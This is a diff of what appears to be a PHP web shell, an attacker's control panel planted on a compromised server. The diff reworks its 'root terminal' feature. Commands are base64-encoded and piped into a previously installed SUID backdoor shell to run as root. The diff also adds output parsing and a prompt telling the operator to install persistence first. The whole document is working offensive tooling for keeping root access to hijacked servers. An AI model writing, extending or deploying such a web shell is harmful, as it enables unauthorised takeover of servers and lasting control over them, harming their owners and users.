@@ -3310,7 +3310,7 @@ function list_dir($path) {
 <body>
 <div class="container">
     <div class="menu-panel">
-        <h1>::𝒮 𝒴 𝒜 𝐿 𝒪 𝑀:: ~ 280326 2254</h1>
+        <h1>::𝒮 𝒴 𝒜 𝐿 𝒪 𝑀:: ~ 280326 2306</h1>
         <!-- Quick Actions Row -->
         <div class="section">
             <h3>⚡ Quick Actions</h3>
@@ -7171,12 +7171,15 @@ async function executeRootCommand() {
     
     // Add command to output
     output.innerHTML += '\n<span style="color:#0f0;">root@server# ' + escapeHtml(cmd) + '</span>\n';
+    
+    // Add loading indicator
+    const loadingId = 'loading_' + Date.now();
+    output.innerHTML += '<span id="' + loadingId + '" style="color:#888;">⏳ Executing...</span>';
     output.scrollTop = output.scrollHeight;
     input.value = '';
     
     // Check if we have SUID backdoor
     if (!suidBackdoorPath) {
-        // Try to find existing backdoor
         await checkSuidBackdoor();
     }
     
@@ -7186,7 +7189,10 @@ async function executeRootCommand() {
         
         if (suidBackdoorPath) {
             // Use SUID backdoor for stable root
-            finalCmd = suidBackdoorPath + ' -c "' + cmd.replace(/"/g, '\\"') + '"';
+            // Note: SUID sh may not support -c, use alternative method
+            finalCmd = 'echo "' + btoa(cmd) + '" | base64 -d | ' + suidBackdoorPath;
+            
+            console.log('[RootTerminal] Executing:', finalCmd);
             
             const formData = new FormData();
             formData.append('cmd', finalCmd);
@@ -7195,19 +7201,42 @@ async function executeRootCommand() {
             const response = await fetch('', { method: 'POST', body: formData });
             const html = await response.text();
             
-            // Extract output from response
-            const outputMatch = html.match(/<pre[^>]*>([\s\S]*?)<\/pre>/i);
-            const result = outputMatch ? outputMatch[1] : html;
+            console.log('[RootTerminal] Response length:', html.length);
             
-            // Clean and display
-            const cleanResult = result.replace(/<[^>]+>/g, '').replace(/&lt;/g, '<').replace(/&gt;/g, '>').replace(/&amp;/g, '&');
+            // Remove loading indicator
+            const loadingEl = document.getElementById(loadingId);
+            if (loadingEl) loadingEl.remove();
             
-            if (cleanResult.trim()) {
-                output.innerHTML += '<span style="color:#ccc;">' + escapeHtml(cleanResult) + '</span>';
+            // Parse HTML response using DOMParser (same as regular shell)
+            const parser = new DOMParser();
+            const doc = parser.parseFromString(html, 'text/html');
+            const outputEl = doc.querySelector('.output');
+            
+            if (outputEl) {
+                const result = outputEl.textContent.trim();
+                console.log('[RootTerminal] Output:', result.substring(0, 100));
+                if (result) {
+                    output.innerHTML += '<span style="color:#ccc;">' + escapeHtml(result) + '</span>\n';
+                } else {
+                    output.innerHTML += '<span style="color:#888;">[Command executed, no output]</span>\n';
+                }
             } else {
-                output.innerHTML += '<span style="color:#888;">[Command executed, no output]</span>';
+                // Fallback: try to find pre#shellOutput
+                const shellOutputEl = doc.getElementById('shellOutput');
+                if (shellOutputEl) {
+                    const result = shellOutputEl.textContent.trim();
+                    output.innerHTML += '<span style="color:#ccc;">' + escapeHtml(result) + '</span>\n';
+                } else {
+                    console.log('[RootTerminal] No output element found');
+                    output.innerHTML += '<span style="color:#f44;">[Error: Could not parse command output]</span>\n';
+                    output.innerHTML += '<span style="color:#888;">Raw: ' + escapeHtml(html.substring(0, 300)) + '...</span>\n';
+                }
             }
         } else {
+            // Remove loading indicator
+            const loadingEl = document.getElementById(loadingId);
+            if (loadingEl) loadingEl.remove();
+            
             // No SUID backdoor - explain to user
             output.innerHTML += '<span style="color:#f44;">❌ Cannot execute as root: No SUID backdoor found!</span>\n';
             output.innerHTML += '<span style="color:#ff0;">💡 SOLUTION: Click 🔒 Persist button to install persistence first.</span>\n';
@@ -7216,7 +7245,11 @@ async function executeRootCommand() {
         }
         
     } catch (err) {
-        output.innerHTML += '<span style="color:#f44;">Error: ' + err.message + '</span>';
+        // Remove loading indicator
+        const loadingEl = document.getElementById(loadingId);
+        if (loadingEl) loadingEl.remove();
+        
+        output.innerHTML += '<span style="color:#f44;">Error: ' + escapeHtml(err.message) + '</span>\n';
     }
     
     output.scrollTop = output.scrollHeight;
